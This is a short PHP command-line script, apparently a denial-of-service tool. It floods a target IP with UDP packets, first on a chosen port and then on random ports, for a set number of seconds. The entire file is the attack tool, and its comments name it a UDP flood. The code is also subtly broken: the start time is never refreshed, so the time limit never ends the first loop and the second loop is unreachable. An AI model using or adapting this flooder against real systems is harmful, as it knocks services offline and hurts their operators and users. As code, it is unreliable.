<?php

    $packets = 0;
    
    ignore_user_abort(TRUE);
    set_time_limit(0);

    $arguments = $argv;

    array_shift($arguments);

    $ipIndex = array_search('-ip', $arguments);
    $ipValue = $arguments[$ipIndex + 1];

    $portIndex = array_search('-port', $arguments);
    $portValue = $arguments[$portIndex + 1];

    $timeIndex = array_search('-time', $arguments);
    $timeValue = $arguments[$timeIndex + 1];

    $time = $timeValue; //Время в секундах - 60 секунд = 1 минута
    $host = $ipValue;
    $port = $portValue;

    $get_time = time();

    print("Started: " . date('d-m-y h:i:s'));

    $max_time = $get_time + $time;

    for($i= 0 ; $i < 65000; $i++) {

        $out = 'X';

    }

    while(True) {

        $packets++;

        if ($get_time > $max_time) {

            break;

        }

        $fp_tcp = fsockopen('udp://' . $host, $port, $errno, $errstr, 5);

        //echo("UDP Flood - Completed with $packets (" . round(($packets * 65) / 1024, 2) . " MB) packets averaging " . round($packets / $time, 2) . " packets per second\n");

        if ($fp_tcp) {

            fwrite($fp_tcp, $out);
            fclose($fp_tcp);

        }

    }

    while(True) {

        $packets++;

        if ($get_time > $max_time) {

            break;

        }

        $rand = rand(1,65000);

        $fp_tcp = fsockopen('udp://' . $host, $rand, $errno, $errstr, 5);

        //echo("UDP Flood - Completed with $packets (" . round(($packets * 65) / 1024, 2) . " MB) packets averaging " . round($packets / $time, 2) . " packets per second\n");

        if ($fp_tcp) {

            fwrite($fp_tcp, $out);
            fclose($fp_tcp);

        }

    }

?>
